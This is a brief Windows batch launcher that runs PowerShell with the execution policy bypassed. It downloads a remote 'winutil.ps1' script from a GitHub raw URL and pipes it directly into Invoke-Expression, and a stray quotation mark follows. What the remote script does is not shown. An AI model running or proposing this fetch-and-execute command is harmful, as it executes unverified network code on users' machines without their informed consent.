@echo off
powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/galshinew/installer/main/winutil.ps1 | iex"
"
exit
